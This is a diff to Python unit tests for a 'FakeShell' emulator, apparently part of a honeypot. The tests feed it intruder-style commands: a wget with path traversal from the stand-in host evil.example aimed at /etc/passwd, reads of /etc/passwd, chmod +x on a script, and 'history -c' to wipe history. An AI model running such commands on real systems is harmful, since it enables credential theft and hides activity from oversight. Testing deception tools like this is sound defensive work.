@@ -37,7 +37,27 @@ def test_download():
     assert sh.downloads[1]["name"] == "y.sh"
     sh.run("wget http://evil.example/../../etc/passwd")
     assert sh.downloads[2]["name"] == "passwd"
-    
+
+def test_command_chains():
+    sh = FakeShell()
+    assert sh.run("pwd; whoami") == "/root\nroot\n"
+    assert sh.run("cd /tmp && pwd") == "/tmp\n"
+
+
+def test_pipe_and_utils():
+    sh = FakeShell()
+    out = sh.run("ps aux | grep sshd")
+    assert "sshd" in out
+    assert "systemd" not in out
+    assert sh.run("cat /etc/passwd | wc -l") == "2\n"
+
+
+def test_history_and_chmod():
+    sh = FakeShell()
+    assert sh.run("chmod +x x.sh") == ""
+    assert "chmod +x x.sh" in sh.run("history")
+    sh.run("history -c")
+    assert sh.run("history") == ""
 
 def test_exit():
     sh = FakeShell()
